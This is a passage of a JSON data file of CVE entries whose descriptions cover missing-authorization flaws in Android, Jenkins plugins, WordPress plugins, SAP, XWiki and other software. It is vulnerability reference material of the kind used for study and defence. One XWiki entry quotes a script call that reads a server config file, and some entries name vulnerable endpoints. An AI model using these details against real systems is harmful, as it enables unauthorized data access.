SGW-300, ACM-300, GCM-300, so unauthorized users can remotely control the device."}, {"Reference": "CVE-2022-28993", "Description": "Multi Store Inventory Management System v1.0 allows attackers to perform an account takeover via a crafted POST request."}, {"Reference": "CVE-2022-38183", "Description": "In Gitea before 1.16.9, it was possible for users to add existing issues to projects. Due to improper access controls, an attacker could assign any issue to any project in Gitea (there was no permission check for fetching the issue). As a result, the attacker would get access to private issue titles."}, {"Reference": "CVE-2022-4148", "Description": "The WP OAuth Server (OAuth Authentication) WordPress plugin before 4.3.0 has a flawed CSRF and authorisation check when deleting a client, which could allow any authenticated users, such as subscriber to delete arbitrary client."}, {"Reference": "CVE-2021-28052", "Description": "A tenant administrator Hitachi Content Platform (HCP) may modify the configuration in another tenant without authorization, potentially allowing unauthorized access to data in the other tenant. Also, a tenant user (non-administrator) may view configuration in another tenant without authorization. This issue affects: Hitachi Vantara Hitachi Content Platform versions prior to 8.3.7; 9.0.0 versions prior to 9.2.3."}, {"Reference": "CVE-2021-31576", "Description": "In Boa, there is a possible information disclosure due to a missing permission check. This could lead to remote information disclosure to a proximal attacker with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: A20210008; Issue ID: OSBNB00123241."}, {"Reference": "CVE-2021-32504", "Description": "Unauthenticated users can access sensitive web URLs through GET request, which should be restricted to maintenance users only. A malicious attacker could use this sensitive information\u2019s to launch further attacks on the system."}, {"Reference": "CVE-2021-42848", "Description": "An information disclosure vulnerability was reported in some Lenovo Personal Cloud Storage devices that could allow an unauthenticated user to retrieve device and networking details."}, {"Reference": "CVE-2021-4331", "Description": "The Plus Addons for Elementor plugin for WordPress is vulnerable to privilege escalation in versions up to, and including 4.1.9 (pro) and 2.0.6 (free). The plugin adds a registration form to the Elementor page builders functionality. As part of the registration form, users can choose which role to set as the default for users upon registration. This field is not hidden for lower-level users so any user with access to the Elementor page builder, such as contributors, can set the default role to administrator. Since contributors can not publish posts, only author+ users can elevate privileges without interaction via a site administrator (to approve a post)."}, {"Reference": "CVE-2022-0152", "Description": "An issue has been discovered in GitLab affecting all versions starting from 13.10 before 14.4.5, all versions starting from 14.5.0 before 14.5.3, all versions starting from 14.6.0 before 14.6.2. GitLab was vulnerable to unauthorized access to some particular fields through the GraphQL API."}, {"Reference": "CVE-2022-0236", "Description": "The WP Import Export WordPress plugin (both free and premium versions) is vulnerable to unauthenticated sensitive data disclosure due to a missing capability check on the download function wpie_process_file_download found in the ~/includes/classes/class-wpie-general.php file. This made it possible for unauthenticated attackers to download any imported or exported information from a vulnerable site which can contain sensitive information like user data. This affects versions up to, and including, 3.9.15."}, {"Reference": "CVE-2022-1020", "Description": "The Product Table for WooCommerce (wooproducttable) WordPress plugin before 3.1.2 does not have authorisation and CSRF checks in the wpt_admin_update_notice_option AJAX action (available to both unauthenticated and authenticated users), as well as does not validate the callback parameter, allowing unauthenticated attackers to call arbitrary functions with either none or one user controlled argument"}, {"Reference": "CVE-2022-1521", "Description": "LRM does not implement authentication or authorization by default. A malicious actor can inject, replay, modify, and/or intercept sensitive data."}, {"Reference": "CVE-2022-20011", "Description": "In getArray of NotificationManagerService.java , there is a possible leak of one user notifications to another due to missing check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12LAndroid ID: A-214999128"}, {"Reference": "CVE-2022-20024", "Description": "In system service, there is a possible permission bypass due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06219064; Issue ID: ALPS06219064."}, {"Reference": "CVE-2022-20041", "Description": "In Bluetooth, there is a possible escalation of privilege due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06108596; Issue ID: ALPS06108596."}, {"Reference": "CVE-2022-20043", "Description": "In Bluetooth, there is a possible escalation of privilege due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06148177; Issue ID: ALPS06148177."}, {"Reference": "CVE-2022-20084", "Description": "In telephony, there is a possible way to disable receiving emergency broadcasts due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06498874; Issue ID: ALPS06498874."}, {"Reference": "CVE-2022-20093", "Description": "In telephony, there is a possible way to disable receiving SMS messages due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06498868; Issue ID: ALPS06498868."}, {"Reference": "CVE-2022-20098", "Description": "In aee daemon, there is a possible information disclosure due to a missing permission check. This could lead to local information disclosure with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06419017; Issue ID: ALPS06419017."}, {"Reference": "CVE-2022-20100", "Description": "In aee daemon, there is a possible information disclosure due to a missing permission check. This could lead to local information disclosure with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06383944; Issue ID: ALPS06270804."}, {"Reference": "CVE-2022-20102", "Description": "In aee daemon, there is a possible information disclosure due to a missing permission check. This could lead to local information disclosure with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06296442; Issue ID: ALPS06296405."}, {"Reference": "CVE-2022-20115", "Description": "In broadcastServiceStateChanged of TelephonyRegistry.java, there is a possible way to learn base station information without location permission due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12 Android-12LAndroid ID: A-210118427"}, {"Reference": "CVE-2022-20121", "Description": "In getNodeValue of USCCDMPlugin.java, there is a possible disclosure of ICCID due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android kernelAndroid ID: A-212573046References: N/A"}, {"Reference": "CVE-2022-20225", "Description": "In getSubscriptionProperty of SubscriptionController.java, there is a possible read of a sensitive identifier due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12LAndroid ID: A-213457638"}, {"Reference": "CVE-2022-20335", "Description": "In Wifi Slice, there is a possible way to adjust Wi-Fi settings even when the permission has been disabled due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-178014725"}, {"Reference": "CVE-2022-20336", "Description": "In Settings, there is a possible installed application disclosure due to a missing permission check. This could lead to local information disclosure of applications allow-listed to use the network during VPN lockdown mode with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-177239688"}, {"Reference": "CVE-2022-20340", "Description": "In SELinux policy, there is a possible way of inferring which websites are being opened in the browser due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-166269532"}, {"Reference": "CVE-2022-20430", "Description": "There is an missing authorization issue in the system service. Since the component does not have permission check , resulting in Local Elevation of privilege.Product: AndroidVersions: Android SoCAndroid ID: A-242221233"}, {"Reference": "CVE-2022-20431", "Description": "There is an missing authorization issue in the system service. Since the component does not have permission check , resulting in Local Elevation of privilege.Product: AndroidVersions: Android SoCAndroid ID: A-242221238"}, {"Reference": "CVE-2022-20432", "Description": "There is an missing authorization issue in the system service. Since the component does not have permission check and permission protection,, resulting in Local Elevation of privilege.Product: AndroidVersions: Android SoCAndroid ID: A-242221899"}, {"Reference": "CVE-2022-20433", "Description": "There is an missing authorization issue in the system service. Since the component does not have permission check , resulting in Local Elevation of privilege.Product: AndroidVersions: Android SoCAndroid ID: A-242221901"}, {"Reference": "CVE-2022-20434", "Description": "There is an missing authorization issue in the system service. Since the component does not have permission check , resulting in Local Elevation of privilege.Product: AndroidVersions: Android SoCAndroid ID: A-242244028"}, {"Reference": "CVE-2022-20446", "Description": "In AlwaysOnHotwordDetector of AlwaysOnHotwordDetector.java, there is a possible way to access the microphone from the background due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-10 Android-11Android ID: A-229793943"}, {"Reference": "CVE-2022-20450", "Description": "In restorePermissionState of PermissionManagerServiceImpl.java, there is a possible way to bypass user consent due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12L Android-13Android ID: A-210065877"}, {"Reference": "CVE-2022-20451", "Description": "In onCallRedirectionComplete of CallsManager.java, there is a possible permissions bypass due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12L Android-13Android ID: A-235098883"}, {"Reference": "CVE-2022-20503", "Description": "In onCreate of WifiDppConfiguratorActivity.java, there is a possible way for a guest user to add a WiFi configuration due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-224772890"}, {"Reference": "CVE-2022-20504", "Description": "In multiple locations of DreamManagerService.java, there is a missing permission check. This could lead to local escalation of privilege and dismissal of system dialogs with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-225878553"}, {"Reference": "CVE-2022-20506", "Description": "In onCreate of WifiDialogActivity.java, there is a missing permission check. This could lead to local escalation of privilege from a guest user with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-226133034"}, {"Reference": "CVE-2022-20519", "Description": "In onCreate of AddAppNetworksActivity.java, there is a possible way for a guest user to configure WiFi networks due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-224772678"}, {"Reference": "CVE-2022-20522", "Description": "In getSlice of ProviderModelSlice.java, there is a missing permission check. This could lead to local escalation of privilege from the guest user with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-227470877"}, {"Reference": "CVE-2022-20533", "Description": "In getSlice of WifiSlice.java, there is a possible way to connect a new WiFi network from the guest mode due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-232798363"}, {"Reference": "CVE-2022-20536", "Description": "In registerBroadcastReceiver of RcsService.java, there is a possible way to change preferred TTY mode due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-235100180"}, {"Reference": "CVE-2022-20537", "Description": "In createDialog of WifiScanModeActivity.java, there is a possible way for a Guest user to enable location-sensitive settings due to a missing permission check. This could lead to local escalation of privilege from the Guest user with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-235601169"}, {"Reference": "CVE-2022-20544", "Description": "In onOptionsItemSelected of ManageApplications.java, there is a possible bypass of profile owner restrictions due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-238745070"}, {"Reference": "CVE-2022-20556", "Description": "In launchConfigNewNetworkFragment of NetworkProviderSettings.java, there is a possible way for the guest user to add a new WiFi network due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-246301667"}, {"Reference": "CVE-2022-20614", "Description": "A missing permission check in Jenkins Mailer Plugin 391.ve4a_38c1b_cf4b_ and earlier allows attackers with Overall/Read access to use the DNS used by the Jenkins instance to resolve an attacker-specified hostname."}, {"Reference": "CVE-2022-20616", "Description": "Jenkins Credentials Binding Plugin 1.27 and earlier does not perform a permission check in a method implementing form validation, allowing attackers with Overall/Read access to validate if a credential ID refers to a secret file credential and whether it's a zip file."}, {"Reference": "CVE-2022-20618", "Description": "A missing permission check in Jenkins Bitbucket Branch Source Plugin 737.vdf9dc06105be and earlier allows attackers with Overall/Read access to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-20620", "Description": "Missing permission checks in Jenkins SSH Agent Plugin 1.23 and earlier allows attackers with Overall/Read access to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-21660", "Description": "Gin-vue-admin is a backstage management system based on vue and gin. In versions prior to 2.4.7 low privilege users are able to modify higher privilege users. Authentication is missing on the `setUserInfo` function. Users are advised to update as soon as possible. There are no known workarounds."}, {"Reference": "CVE-2022-21763", "Description": "In telecom service, there is a possible information disclosure due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS07044717; Issue ID: ALPS07044708."}, {"Reference": "CVE-2022-21764", "Description": "In telecom service, there is a possible information disclosure due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS07044717; Issue ID: ALPS07044717."}, {"Reference": "CVE-2022-21777", "Description": "In Autoboot, there is a possible permission bypass due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06713894; Issue ID: ALPS06713894."}, {"Reference": "CVE-2022-21953", "Description": "A Missing Authorization vulnerability in of SUSE Rancher allows authenticated user to create an unauthorized shell pod and kubectl access in the local cluster This issue affects: SUSE Rancher Rancher versions prior to 2.5.17; Rancher versions prior to 2.6.10; Rancher versions prior to 2.7.1."}, {"Reference": "CVE-2022-22107", "Description": "In Daybyday CRM, versions 2.0.0 through 2.2.0 are vulnerable to Missing Authorization. An attacker that has the lowest privileges account (employee type user), can view the appointments of all users in the system including administrators. However, this type of user is not authorized to view the calendar at all."}, {"Reference": "CVE-2022-22108", "Description": "In Daybyday CRM, versions 2.0.0 through 2.2.0 are vulnerable to Missing Authorization. An attacker that has the lowest privileges account (employee type user), can view the absences of all users in the system including administrators. This type of user is not authorized to view this kind of information."}, {"Reference": "CVE-2022-22111", "Description": "In DayByDay CRM, version 2.2.0 is vulnerable to missing authorization. Any application user in the application who has update user permission enabled is able to change the password of other users, including the administrator\u2019s. This allows the attacker to gain access to the highest privileged user in the application."}, {"Reference": "CVE-2022-22535", "Description": "SAP ERP HCM Portugal - versions 600, 604, 608, does not perform necessary authorization checks for a report that reads the payroll data of employees in a certain area. Since the affected report only reads the payroll information, the attacker can neither modify any information nor cause availability impacts."}, {"Reference": "CVE-2022-2276", "Description": "The WP Edit Menu WordPress plugin before 1.5.0 does not have authorisation and CSRF in an AJAX action, which could allow unauthenticated attackers to delete arbitrary posts/pages from the blog"}, {"Reference": "CVE-2022-23055", "Description": "In ERPNext, versions v11.0.0-beta through v13.0.2 are vulnerable to Missing Authorization, in the chat rooms functionality. A low privileged attacker can send a direct message or a group message to any member or group, impersonating themselves as the administrator. The attacker can also read chat messages of groups that they do not belong to, and of other users."}, {"Reference": "CVE-2022-23112", "Description": "A missing permission check in Jenkins Publish Over SSH Plugin 1.22 and earlier allows attackers with Overall/Read access to connect to an attacker-specified SSH server using attacker-specified credentials."}, {"Reference": "CVE-2022-23183", "Description": "Missing authorization vulnerability in Advanced Custom Fields versions prior to 5.12.1 and Advanced Custom Fields Pro versions prior to 5.12.1 allows a remote authenticated attacker to view the information on the database without the access permission."}, {"Reference": "CVE-2022-2350", "Description": "The Disable User Login WordPress plugin through 1.0.1 does not have authorisation and CSRF checks when updating its settings, allowing unauthenticated attackers to block (or unblock) users at will."}, {"Reference": "CVE-2022-23617", "Description": "XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. In affected versions any user with edit right can copy the content of a page it does not have access to by using it as template of a new page. This issue has been patched in XWiki 13.2CR1 and 12.10.6. Users are advised to update. There are no known workarounds for this issue."}, {"Reference": "CVE-2022-23621", "Description": "XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. In affected versions any user with SCRIPT right can read any file located in the XWiki WAR (for example xwiki.cfg and xwiki.properties) through XWiki#invokeServletAndReturnAsString as `$xwiki.invokeServletAndReturnAsString(\"/WEB-INF/xwiki.cfg\")`. This issue has been patched in XWiki versions 12.10.9, 13.4.3 and 13.7-rc-1. Users are advised to update. The only workaround is to limit SCRIPT right."}, {"Reference": "CVE-2022-2369", "Description": "The YaySMTP WordPress plugin before 2.2.1 does not have capability check in an AJAX action, allowing any logged in users, such as subscriber to view the Logs of the plugin"}, {"Reference": "CVE-2022-23709", "Description": "A flaw was discovered in Kibana in which users with Read access to the Uptime feature could modify alerting rules. A user with this privilege would be able to create new alerting rules or overwrite existing ones. However, any new or modified rules would not be enabled, and a user with this privilege could not modify alerting connectors. This effectively means that Read users could disable existing alerting rules."}, {"Reference": "CVE-2022-2373", "Description": "The Simply Schedule Appointments WordPress plugin before 1.5.7.7 is missing authorisation in a REST endpoint, allowing unauthenticated users to retrieve WordPress users details such as name and email address"}, {"Reference": "CVE-2022-2376", "Description": "The Directorist WordPress plugin before 7.3.1 discloses the email address of all users in an AJAX action available to both unauthenticated and any authenticated users"}, {"Reference": "CVE-2022-2377", "Description": "The Directorist WordPress plugin before 7.3.0 does not have authorisation and CSRF checks in an AJAX action, allowing any authenticated users to send arbitrary emails on behalf of the blog"}, {"Reference": "CVE-2022-2382", "Description": "The Product Slider for WooCommerce WordPress plugin before 2.5.7 has flawed CSRF checks and lack authorisation in some of its AJAX actions, allowing any authenticated users, such as subscriber to call them. One in particular could allow them to delete arbitrary blog options."}, {"Reference": "CVE-2022-2389", "Description": "The Abandoned Cart Recovery for WooCommerce, Follow Up Emails, Newsletter Builder & Marketing Automation By Autonami WordPress plugin before 2.1.2 does not have authorisation and CSRF checks in one of its AJAX action, allowing any authenticated users, such as subscriber to create automations"}, {"Reference": "CVE-2022-2405", "Description": "The WP Popup Builder WordPress plugin before 1.2.9 does not have authorisation and CSRF check in an AJAX action, allowing any authenticated users, such as subscribers to delete arbitrary Popup"}, {"Reference": "CVE-2022-24190", "Description": "The /device/acceptBind end-point for Ourphoto App version 1.4.1 does not require authentication or authorization. The user_token header is not implemented or present on this end-point. An attacker can send a request to bind their account to any users picture frame, then send a POST request to accept their own bind request, without the end-users approval or interaction."}, {"Reference": "CVE-2022-24317", "Description": "A CWE-862: Missing Authorization vulnerability exists that could cause information exposure when an attacker sends a specific message. Affected Product: Interactive Graphical SCADA System Data Server (V15.0.0.22020 and prior)"}, {"Reference": "CVE-2022-2450", "Description": "The reSmush.it : the only free Image Optimizer & compress plugin WordPress plugin before 0.4.4 lacks authorization in various AJAX actions, allowing any logged-in users, such as subscribers to call them."}, {"Reference": "CVE-2022-24669", "Description": "It may be possible to gain some details of the deployment through a well-crafted attack. This may allow that data to be used to probe internal network services."}, {"Reference": "CVE-2022-24896", "Description": "Tuleap is a Free & Open Source Suite to manage software developments and collaboration. In versions prior to 13.7.99.239 Tuleap does not properly verify authorizations when displaying the content of tracker report renderer and chart widgets. Malicious users could use this vulnerability to retrieve the name of a tracker they cannot access as well as the name of the fields used in reports."}, {"Reference": "CVE-2022-25190", "Description": "A missing permission check in Jenkins Conjur Secrets Plugin 1.0.11 and earlier allows attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-25193", "Description": "Missing permission checks in Jenkins Snow Commander Plugin 1.10 and earlier allow attackers with Overall/Read permission to connect to an attacker-specified webserver using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins."}, {"Reference": "CVE-2022-25195", "Description": "A missing permission check in Jenkins autonomiq Plugin 1.15 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL using attacker-specified credentials."}, {"Reference": "CVE-2022-25199", "Description": "A missing permission check in Jenkins SCP publisher Plugin 1.8 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified SSH server using attacker-specified credentials."}, {"Reference": "CVE-2022-25201", "Description": "Missing permission checks in Jenkins Checkmarx Plugin 2022.1.2 and earlier allow attackers with Overall/Read permission to connect to an attacker-specified webserver using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins."}, {"Reference": "CVE-2022-25206", "Description": "A missing check in Jenkins dbCharts Plugin 0.5.2 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified database via JDBC using attacker-specified credentials."}, {"Reference": "CVE-2022-25208", "Description": "A missing permission check in Jenkins Chef Sinatra Plugin 1.20 and earlier allows attackers with Overall/Read permission to have Jenkins send an HTTP request to an attacker-controlled URL and have it parse an XML response."}, {"Reference": "CVE-2022-25211", "Description": "A missing permission check in Jenkins SWAMP Plugin 1.2.6 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified web server using attacker-specified credentials."}, {"Reference": "CVE-2022-2543", "Description": "The Visual Portfolio, Photo Gallery & Post Grid WordPress plugin before 2.18.0 does not have proper authorisation checks in some of its REST endpoints, allowing unauthenticated users to call them and inject arbitrary CSS in arbitrary saved layouts"}, {"Reference": "CVE-2022-25810", "Description": "The Transposh WordPress Translation WordPress plugin through 1.0.8 exposes a couple of sensitive actions such has \u201ctp_reset\u201d under the Utilities tab (/wp-admin/admin.php?page=tp_utils), which can be used/executed as the lowest-privileged user. Basically all Utilities functionalities are vulnerable this way, which involves resetting configurations and backup/restore operations."}, {"Reference": "CVE-2022-26102", "Description": "Due to missing authorization check, SAP NetWeaver Application Server for ABAP - versions 700, 701, 702, 731, allows an authenticated attacker, to access content on the start screen of any transaction that is available with in the same SAP system even if he/she isn't authorized for that transaction. A successful exploitation could expose information and in worst case manipulate data before the start screen is executed, resulting in limited impact on confidentiality and integrity of the application."}, {"Reference": "CVE-2022-26104", "Description": "SAP Financial Consolidation - version 10.1, does not perform necessary authorization checks for updating homepage messages, resulting for an unauthorized user to alter the maintenance system message."}, {"Reference": "CVE-2022-26546", "Description": "Hospital Management System v1.0 was discovered to lack an authorization component, allowing attackers to access sensitive information and obtain the admin password."}, {"Reference": "CVE-2022-2657", "Description": "The Multivendor Marketplace Solution for WooCommerce WordPress plugin before 3.8.12 is lacking authorisation and CSRF in multiple AJAX actions, which could allow any authenticated users, such as subscriber to call them and suspend vendors (reporter by the submitter) or update arbitrary order status (identified by WPScan when verifying the issue) for example. Other unauthenticated attacks are also possible, either directly or via CSRF"}, {"Reference": "CVE-2022-26581", "Description": "PAX A930 device with PayDroid_7.1.1_Virgo_V04.3.26T1_20210419 can allow an unauthorized attacker to perform privileged actions through the execution of specific binaries listed in ADB daemon. The attacker must have physical USB access to the device in order to exploit this vulnerability."}, {"Reference": "CVE-2022-2696", "Description": "The Restaurant Menu \u2013 Food Ordering System \u2013 Table Reservation plugin for WordPress is vulnerable to authorization bypass via several AJAX actions in versions up to, and including 2.3.0 due to missing capability checks and missing nonce validation. This makes it possible for authenticated attackers with minimal permissions to perform a wide variety of actions such as modifying the plugin's settings and modifying the ordering system preferences."}, {"Reference": "CVE-2022-27199", "Description": "A missing permission check in Jenkins CloudBees AWS Credentials Plugin 189.v3551d5642995 and earlier allows attackers with Overall/Read permission to connect to an AWS service using an attacker-specified token."}, {"Reference": "CVE-2022-27205", "Description": "A missing permission check in Jenkins Extended Choice Parameter Plugin 346.vd87693c5a_86c and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL."}, {"Reference": "CVE-2022-27209", "Description": "A missing permission check in Jenkins Kubernetes Continuous Deploy Plugin 2.3.1 and earlier allows attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-27215", "Description": "A missing permission check in Jenkins Release Helper Plugin 1.3.3 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL using attacker-specified credentials."}, {"Reference": "CVE-2022-27658", "Description": "Under certain conditions, SAP Innovation management - version 2.0, allows an attacker to access information which could lead to information gathering for further exploits and attacks."}, {"Reference": "CVE-2022-27669", "Description": "An unauthenticated user can use functions of XML Data Archiving Service of SAP NetWeaver Application Server for Java - version 7.50, to which access should be restricted. This may result in an escalation of privileges."}, {"Reference": "CVE-2022-28134", "Description": "Jenkins Bitbucket Server Integration Plugin 3.1.0 and earlier does not perform permission checks in several HTTP endpoints, allowing attackers with Overall/Read permission to create, view, and delete BitBucket Server consumers."}, {"Reference": "CVE-2022-28137", "Description": "A missing permission check in Jenkins JiraTestResultReporter Plugin 165.v817928553942 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL using attacker-specified credentials."}, {"Reference": "CVE-2022-28139", "Description": "A missing permission check in Jenkins RocketChat Notifier Plugin 1.4.10 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL using attacker-specified credentials."}, {"Reference": "CVE-2022-28144", "Description": "Jenkins Proxmox Plugin 0.7.0 and earlier does not perform a permission check in several HTTP endpoints, allowing attackers with Overall/Read permission to connect to an attacker-specified host using attacker-specified username and password (perform a connection test), disable SSL/TLS validation for the entire Jenkins controller JVM as part of the connection test (see CVE-2022-28142), and test a rollback with attacker-specified parameters."}, {"Reference": "CVE-2022-28147", "Description": "A missing permission check in Jenkins Continuous Integration with Toad Edge Plugin 2.3 and earlier allows attackers with Overall/Read permission to check for the existence of an attacker-specified file path on the Jenkins controller file system."}, {"Reference": "CVE-2022-28151", "Description": "A missing permission check in Jenkins Job and Node ownership Plugin 0.13.0 and earlier allows attackers with Item/Read permission to change the owners and item-specific permissions of a job."}, {"Reference": "CVE-2022-28158", "Description": "A missing permission check in Jenkins Pipeline: Phoenix AutoTest Plugin 1.3 and earlier allows attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-29051", "Description": "Missing permission checks in Jenkins Publish Over FTP Plugin 1.16 and earlier allow attackers with Overall/Read permission to connect to an FTP server using attacker-specified credentials."}, {"Reference": "CVE-2022-29611", "Description": "SAP NetWeaver Application Server for ABAP and ABAP Platform do not perform necessary authorization checks for an authenticated user, resulting in escalation of privileges."}, {"Reference": "CVE-2022-2985", "Description": "In music service, there is a missing permission check. This could lead to elevation of privilege in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-2987", "Description": "The Ldap WP Login / Active Directory Integration WordPress plugin before 3.0.2 does not have any authorisation and CSRF checks when updating it's settings (which are hooked to the init action), allowing unauthenticated attackers to update them. Attackers could set their own LDAP server to be used to authenticated users, therefore bypassing the current authentication"}, {"Reference": "CVE-2022-30951", "Description": "Jenkins WMI Windows Agents Plugin 1.8 and earlier includes the Windows Remote Command library does not implement access control, potentially allowing users to start processes even if they're not allowed to log in."}, {"Reference": "CVE-2022-30954", "Description": "Jenkins Blue Ocean Plugin 1.25.3 and earlier does not perform a permission check in several HTTP endpoints, allowing attackers with Overall/Read permission to connect to an attacker-specified HTTP server."}, {"Reference": "CVE-2022-30955", "Description": "Jenkins GitLab Plugin 1.5.31 and earlier does not perform a permission check in an HTTP endpoint, allowing attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-30957", "Description": "A missing permission check in Jenkins SSH Plugin 2.6.1 and earlier allows attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-31128", "Description": "Tuleap is a Free & Open Source Suite to improve management of software developments and collaboration. In affected versions Tuleap does not properly verify permissions when creating branches with the REST API in Git repositories using the fine grained permissions. Users can create branches via the REST endpoint `POST git/:id/branches` regardless of the permissions set on the repository. This issue has been fixed in version 13.10.99.82 Tuleap Community Edition as well as in version 13.10-3 of Tuleap Enterprise Edition. Users are advised to upgrade. There are no known workarounds for this issue."}, {"Reference": "CVE-2022-31167", "Description": "XWiki Platform Security Parent POM contains the security APIs for XWiki Platform, a generic wiki platform. Starting with version 5.0 and prior to 12.10.11, 13.10.1, and 13.4.6, a bug in the security cache stores rules associated to document Page1.Page2 and space Page1.Page2 in the same cache entry. That means that it's possible to overwrite the rights of a space or a document by creating the page of the space with the same name and checking the right of the new one first so that they end up in the security cache and are used for the other too. The problem has been patched in XWiki 12.10.11, 13.10.1, and 13.4.6. There are no known workarounds."}, {"Reference": "CVE-2022-31592", "Description": "The application SAP Enterprise Extension Defense Forces & Public Security - versions 605, 606, 616,617,618, 802, 803, 804, 805, 806, does not perform necessary authorization checks for an authenticated user over the network, resulting in escalation of privileges leading to a limited impact on confidentiality."}, {"Reference": "CVE-2022-31597", "Description": "Within SAP S/4HANA - versions S4CORE 101, 102, 103, 104, 105, 106, SAPSCORE 127, the application business partner extension for Spain/Slovakia does not perform necessary authorization checks for a low privileged authenticated user over the network, resulting in escalation of privileges leading to low impact on confidentiality and integrity of the data."}, {"Reference": "CVE-2022-3400", "Description": "The Bricks theme for WordPress is vulnerable to authorization bypass due to a missing capability check on the bricks_save_post AJAX action in versions 1.0 to 1.5.3. This makes it possible for authenticated attackers with minimal permissions, such as a subscriber, to edit any page, post, or template on the vulnerable WordPress website."}, {"Reference": "CVE-2022-34796", "Description": "A missing permission check in Jenkins Deployment Dashboard Plugin 1.0.10 and earlier allows attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-34798", "Description": "Jenkins Deployment Dashboard Plugin 1.0.10 and earlier does not perform a permission check in several HTTP endpoints, allowing attackers with Overall/Read permission to connect to an attacker-specified HTTP URL using attacker-specified credentials."}, {"Reference": "CVE-2022-34810", "Description": "A missing check in Jenkins RQM Plugin 2.8 and earlier allows attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-34811", "Description": "A missing permission check in Jenkins XPath Configuration Viewer Plugin 1.1.1 and earlier allows attackers with Overall/Read permission to access the XPath Configuration Viewer page."}, {"Reference": "CVE-2022-34813", "Description": "A missing permission check in Jenkins XPath Configuration Viewer Plugin 1.1.1 and earlier allows attackers with Overall/Read permission to create and delete XPath expressions."}, {"Reference": "CVE-2022-34818", "Description": "Jenkins Failed Job Deactivator Plugin 1.2.1 and earlier does not perform permission checks in several views and HTTP endpoints, allowing attackers with Overall/Read permission to disable 